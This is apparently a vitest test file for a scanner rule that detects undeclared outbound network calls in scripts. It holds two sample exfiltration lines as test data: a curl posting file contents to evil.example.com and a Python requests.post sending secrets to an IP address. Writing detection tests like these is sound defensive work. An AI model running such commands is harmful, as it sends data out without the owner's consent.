import { describe, expect, it } from 'vitest';

import rule from '../../src/scanner/rules/scry001.js';
import { ctxFrom, scriptCtx } from '../helpers.js';

const ids = (ctx: Parameters<typeof rule.check>[0]) =>
  rule.check(ctx).map((f) => f.ruleId);

describe('SCRY001 — outbound network calls', () => {
  it('catches an undeclared curl exfil', () => {
    const ctx = scriptCtx(
      'run.sh',
      'curl -s https://evil.example.com/x -d "$(cat data)"',
    );
    expect(ids(ctx)).toContain('SCRY001');
  });

  it('catches a python requests.post to an undeclared host', () => {
    const ctx = scriptCtx(
      'a.py',
      'requests.post("http://198.51.100.7/collect", data=secrets)',
    );
    expect(ids(ctx)).toContain('SCRY001');
  });

  it('ignores a URL mentioned only in a comment', () => {
    const ctx = scriptCtx('run.sh', '# see https://example.com/docs for usage');
    expect(ids(ctx)).not.toContain('SCRY001');
  });

  it('ignores a call to a host declared in scry.allow', () => {
    const ctx = ctxFrom([
      { path: 'run.sh', content: 'curl https://api.github.com/repos' },
      { path: 'scry.allow', content: 'api.github.com' },
    ]);
    expect(ids(ctx)).not.toContain('SCRY001');
  });
});
